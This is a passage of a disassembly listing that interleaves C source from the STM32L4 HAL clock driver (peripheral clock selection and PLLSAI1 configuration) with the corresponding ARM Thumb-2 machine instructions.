  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004914:	687b      	ldr	r3, [r7, #4]
 8004916:	681b      	ldr	r3, [r3, #0]
 8004918:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800491c:	2b00      	cmp	r3, #0
 800491e:	d00a      	beq.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 8004920:	4b6a      	ldr	r3, [pc, #424]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004922:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004926:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 800492a:	687b      	ldr	r3, [r7, #4]
 800492c:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800492e:	4967      	ldr	r1, [pc, #412]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004930:	4313      	orrs	r3, r2
 8004932:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 8004936:	687b      	ldr	r3, [r7, #4]
 8004938:	681b      	ldr	r3, [r3, #0]
 800493a:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800493e:	2b00      	cmp	r3, #0
 8004940:	d00a      	beq.n	8004958 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 8004942:	4b62      	ldr	r3, [pc, #392]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004944:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004948:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 800494c:	687b      	ldr	r3, [r7, #4]
 800494e:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004950:	495e      	ldr	r1, [pc, #376]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004952:	4313      	orrs	r3, r2
 8004954:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004958:	687b      	ldr	r3, [r7, #4]
 800495a:	681b      	ldr	r3, [r3, #0]
 800495c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004960:	2b00      	cmp	r3, #0
 8004962:	d00a      	beq.n	800497a <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004964:	4b59      	ldr	r3, [pc, #356]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004966:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800496a:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 800496e:	687b      	ldr	r3, [r7, #4]
 8004970:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004972:	4956      	ldr	r1, [pc, #344]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004974:	4313      	orrs	r3, r2
 8004976:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 800497a:	687b      	ldr	r3, [r7, #4]
 800497c:	681b      	ldr	r3, [r3, #0]
 800497e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004982:	2b00      	cmp	r3, #0
 8004984:	d00a      	beq.n	800499c <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004986:	4b51      	ldr	r3, [pc, #324]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004988:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800498c:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 8004990:	687b      	ldr	r3, [r7, #4]
 8004992:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004994:	494d      	ldr	r1, [pc, #308]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004996:	4313      	orrs	r3, r2
 8004998:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 800499c:	687b      	ldr	r3, [r7, #4]
 800499e:	681b      	ldr	r3, [r3, #0]
 80049a0:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80049a4:	2b00      	cmp	r3, #0
 80049a6:	d028      	beq.n	80049fa <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80049a8:	4b48      	ldr	r3, [pc, #288]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049aa:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049ae:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80049b2:	687b      	ldr	r3, [r7, #4]
 80049b4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049b6:	4945      	ldr	r1, [pc, #276]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049b8:	4313      	orrs	r3, r2
 80049ba:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80049be:	687b      	ldr	r3, [r7, #4]
 80049c0:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049c2:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80049c6:	d106      	bne.n	80049d6 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80049c8:	4b40      	ldr	r3, [pc, #256]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049ca:	68db      	ldr	r3, [r3, #12]
 80049cc:	4a3f      	ldr	r2, [pc, #252]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049ce:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80049d2:	60d3      	str	r3, [r2, #12]
 80049d4:	e011      	b.n	80049fa <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 80049d6:	687b      	ldr	r3, [r7, #4]
 80049d8:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049da:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80049de:	d10c      	bne.n	80049fa <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80049e0:	687b      	ldr	r3, [r7, #4]
 80049e2:	3304      	adds	r3, #4
 80049e4:	2101      	movs	r1, #1
 80049e6:	4618      	mov	r0, r3
 80049e8:	f000 f882 	bl	8004af0 <RCCEx_PLLSAI1_Config>
 80049ec:	4603      	mov	r3, r0
 80049ee:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 80049f0:	7cfb      	ldrb	r3, [r7, #19]
 80049f2:	2b00      	cmp	r3, #0
 80049f4:	d001      	beq.n	80049fa <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 80049f6:	7cfb      	ldrb	r3, [r7, #19]
 80049f8:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 80049fa:	687b      	ldr	r3, [r7, #4]
 80049fc:	681b      	ldr	r3, [r3, #0]
 80049fe:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004a02:	2b00      	cmp	r3, #0
 8004a04:	d028      	beq.n	8004a58 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004a06:	4b31      	ldr	r3, [pc, #196]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a08:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a0c:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004a10:	687b      	ldr	r3, [r7, #4]
 8004a12:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a14:	492d      	ldr	r1, [pc, #180]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a16:	4313      	orrs	r3, r2
 8004a18:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004a1c:	687b      	ldr	r3, [r7, #4]
 8004a1e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a20:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004a24:	d106      	bne.n	8004a34 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004a26:	4b29      	ldr	r3, [pc, #164]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a28:	68db      	ldr	r3, [r3, #12]
 8004a2a:	4a28      	ldr	r2, [pc, #160]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a2c:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004a30:	60d3      	str	r3, [r2, #12]
 8004a32:	e011      	b.n	8004a58 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004a34:	687b      	ldr	r3, [r7, #4]
 8004a36:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a38:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004a3c:	d10c      	bne.n	8004a58 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004a3e:	687b      	ldr	r3, [r7, #4]
 8004a40:	3304      	adds	r3, #4
 8004a42:	2101      	movs	r1, #1
 8004a44:	4618      	mov	r0, r3
 8004a46:	f000 f853 	bl	8004af0 <RCCEx_PLLSAI1_Config>
 8004a4a:	4603      	mov	r3, r0
 8004a4c:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004a4e:	7cfb      	ldrb	r3, [r7, #19]
 8004a50:	2b00      	cmp	r3, #0
 8004a52:	d001      	beq.n	8004a58 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004a54:	7cfb      	ldrb	r3, [r7, #19]
 8004a56:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004a58:	687b      	ldr	r3, [r7, #4]
 8004a5a:	681b      	ldr	r3, [r3, #0]
 8004a5c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004a60:	2b00      	cmp	r3, #0
 8004a62:	d01c      	beq.n	8004a9e <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004a64:	4b19      	ldr	r3, [pc, #100]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a66:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a6a:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 8004a6e:	687b      	ldr	r3, [r7, #4]
 8004a70:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004a72:	4916      	ldr	r1, [pc, #88]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a74:	4313      	orrs	r3, r2
 8004a76:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004a7a:	687b      	ldr	r3, [r7, #4]
 8004a7c:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004a7e:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 8004a82:	d10c      	bne.n	8004a9e <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004a84:	687b      	ldr	r3, [r7, #4]
 8004a86:	3304      	adds	r3, #4
 8004a88:	2102      	movs	r1, #2
 8004a8a:	4618      	mov	r0, r3
 8004a8c:	f000 f830 	bl	8004af0 <RCCEx_PLLSAI1_Config>
 8004a90:	4603      	mov	r3, r0
 8004a92:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004a94:	7cfb      	ldrb	r3, [r7, #19]
 8004a96:	2b00      	cmp	r3, #0
 8004a98:	d001      	beq.n	8004a9e <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004a9a:	7cfb      	ldrb	r3, [r7, #19]
 8004a9c:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 8004a9e:	687b      	ldr	r3, [r7, #4]
 8004aa0:	681b      	ldr	r3, [r3, #0]
 8004aa2:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004aa6:	2b00      	cmp	r3, #0
 8004aa8:	d00a      	beq.n	8004ac0 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004aaa:	4b08      	ldr	r3, [pc, #32]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004aac:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004ab0:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004ab4:	687b      	ldr	r3, [r7, #4]
 8004ab6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004ab8:	4904      	ldr	r1, [pc, #16]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004aba:	4313      	orrs	r3, r2
 8004abc:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 8004ac0:	7cbb      	ldrb	r3, [r7, #18]
}
 8004ac2:	4618      	mov	r0, r3
 8004ac4:	3718      	adds	r7, #24
 8004ac6:	46bd      	mov	sp, r7
 8004ac8:	bd80      	pop	{r7, pc}
 8004aca:	bf00      	nop
 8004acc:	40021000 	.word	0x40021000

08004ad0 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004ad0:	b480      	push	{r7}
 8004ad2:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004ad4:	4b05      	ldr	r3, [pc, #20]	; (8004aec <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004ad6:	681b      	ldr	r3, [r3, #0]
 8004ad8:	4a04      	ldr	r2, [pc, #16]	; (8004aec <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004ada:	f043 0304 	orr.w	r3, r3, #4
 8004ade:	6013      	str	r3, [r2, #0]
}
 8004ae0:	bf00      	nop
 8004ae2:	46bd      	mov	sp, r7
 8004ae4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004ae8:	4770      	bx	lr
 8004aea:	bf00      	nop
 8004aec:	40021000 	.word	0x40021000

08004af0 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004af0:	b580      	push	{r7, lr}
 8004af2:	b084      	sub	sp, #16
 8004af4:	af00      	add	r7, sp, #0
 8004af6:	6078      	str	r0, [r7, #4]
 8004af8:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004afa:	2300      	movs	r3, #0
 8004afc:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004afe:	4b74      	ldr	r3, [pc, #464]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b00:	68db      	ldr	r3, [r3, #12]
 8004b02:	f003 0303 	and.w	r3, r3, #3
 8004b06:	2b00      	cmp	r3, #0
 8004b08:	d018      	beq.n	8004b3c <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004b0a:	4b71      	ldr	r3, [pc, #452]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b0c:	68db      	ldr	r3, [r3, #12]
 8004b0e:	f003 0203 	and.w	r2, r3, #3
 8004b12:	687b      	ldr	r3, [r7, #4]
 8004b14:	681b      	ldr	r3, [r3, #0]
 8004b16:	429a      	cmp	r2, r3
 8004b18:	d10d      	bne.n	8004b36 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004b1a:	687b      	ldr	r3, [r7, #4]
 8004b1c:	681b      	ldr	r3, [r3, #0]
       ||
 8004b1e:	2b00      	cmp	r3, #0
 8004b20:	d009      	beq.n	8004b36 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 8004b22:	4b6b      	ldr	r3, [pc, #428]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b24:	68db      	ldr	r3, [r3, #12]
 8004b26:	091b      	lsrs	r3, r3, #4
 8004b28:	f003 0307 	and.w	r3, r3, #7
 8004b2c:	1c5a      	adds	r2, r3, #1
 8004b2e:	687b      	ldr	r3, [r7, #4]
 8004b30:	685b      	ldr	r3, [r3, #4]
       ||
 8004b32:	429a      	cmp	r2, r3
 8004b34:	d047      	beq.n	8004bc6 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004b36:	2301      	movs	r3, #1
 8004b38:	73fb      	strb	r3, [r7, #15]
 8004b3a:	e044      	b.n	8004bc6 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004b3c:	687b      	ldr	r3, [r7, #4]
 8004b3e:	681b      	ldr	r3, [r3, #0]
 8004b40:	2b03      	cmp	r3, #3
 8004b42:	d018      	beq.n	8004b76 <RCCEx_PLLSAI1_Config+0x86>
 8004b44:	2b03      	cmp	r3, #3
 8004b46:	d825      	bhi.n	8004b94 <RCCEx_PLLSAI1_Config+0xa4>
 8004b48:	2b01      	cmp	r3, #1
 8004b4a:	d002      	beq.n	8004b52 <RCCEx_PLLSAI1_Config+0x62>
 8004b4c:	2b02      	cmp	r3, #2
 8004b4e:	d009      	beq.n	8004b64 <RCCEx_PLLSAI1_Config+0x74>
 8004b50:	e020      	b.n	8004b94 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 8004b52:	4b5f      	ldr	r3, [pc, #380]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b54:	681b      	ldr	r3, [r3, #0]
 8004b56:	f003 0302 	and.w	r3, r3, #2
 8004b5a:	2b00      	cmp	r3, #0
 8004b5c:	d11d      	bne.n	8004b9a <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 8004b5e:	2301      	movs	r3, #1
 8004b60:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004b62:	e01a      	b.n	8004b9a <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004b64:	4b5a      	ldr	r3, [pc, #360]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b66:	681b      	ldr	r3, [r3, #0]
 8004b68:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004b6c:	2b00      	cmp	r3, #0
 8004b6e:	d116      	bne.n	8004b9e <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004b70:	2301      	movs	r3, #1
 8004b72:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004b74:	e013      	b.n	8004b9e <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004b76:	4b56      	ldr	r3, [pc, #344]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b78:	681b      	ldr	r3, [r3, #0]
 8004b7a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004b7e:	2b00      	cmp	r3, #0
 8004b80:	d10f      	bne.n	8004ba2 <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004b82:	4b53      	ldr	r3, [pc, #332]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b84:	681b      	ldr	r3, [r3, #0]
 8004b86:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004b8a:	2b00      	cmp	r3, #0
 8004b8c:	d109      	bne.n	8004ba2 <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004b8e:	2301      	movs	r3, #1
 8004b90:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004b92:	e006      	b.n	8004ba2 <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004b94:	2301      	movs	r3, #1
 8004b96:	73fb      	strb	r3, [r7, #15]
      break;
 8004b98:	e004      	b.n	8004ba4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004b9a:	bf00      	nop
 8004b9c:	e002      	b.n	8004ba4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004b9e:	bf00      	nop
 8004ba0:	e000      	b.n	8004ba4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004ba2:	bf00      	nop
    }

    if(status == HAL_OK)
 8004ba4:	7bfb      	ldrb	r3, [r7, #15]
 8004ba6:	2b00      	cmp	r3, #0
 8004ba8:	d10d      	bne.n	8004bc6 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004baa:	4b49      	ldr	r3, [pc, #292]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bac:	68db      	ldr	r3, [r3, #12]
 8004bae:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004bb2:	687b      	ldr	r3, [r7, #4]
 8004bb4:	6819      	ldr	r1, [r3, #0]
 8004bb6:	687b      	ldr	r3, [r7, #4]
 8004bb8:	685b      	ldr	r3, [r3, #4]
 8004bba:	3b01      	subs	r3, #1
 8004bbc:	011b      	lsls	r3, r3, #4
 8004bbe:	430b      	orrs	r3, r1
 8004bc0:	4943      	ldr	r1, [pc, #268]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bc2:	4313      	orrs	r3, r2
 8004bc4:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004bc6:	7bfb      	ldrb	r3, [r7, #15]
 8004bc8:	2b00      	cmp	r3, #0
 8004bca:	d17c      	bne.n	8004cc6 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004bcc:	4b40      	ldr	r3, [pc, #256]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bce:	681b      	ldr	r3, [r3, #0]
 8004bd0:	4a3f      	ldr	r2, [pc, #252]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bd2:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004bd6:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004bd8:	f7fc fbc8 	bl	800136c <HAL_GetTick>
 8004bdc:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004bde:	e009      	b.n	8004bf4 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004be0:	f7fc fbc4 	bl	800136c <HAL_GetTick>
 8004be4:	4602      	mov	r2, r0
 8004be6:	68bb      	ldr	r3, [r7, #8]
 8004be8:	1ad3      	subs	r3, r2, r3
 8004bea:	2b02      	cmp	r3, #2
 8004bec:	d902      	bls.n	8004bf4 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004bee:	2303      	movs	r3, #3
 8004bf0:	73fb      	strb	r3, [r7, #15]
        break;
 8004bf2:	e005      	b.n	8004c00 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004bf4:	4b36      	ldr	r3, [pc, #216]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bf6:	681b      	ldr	r3, [r3, #0]
 8004bf8:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004bfc:	2b00      	cmp	r3, #0
 8004bfe:	d1ef      	bne.n	8004be0 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
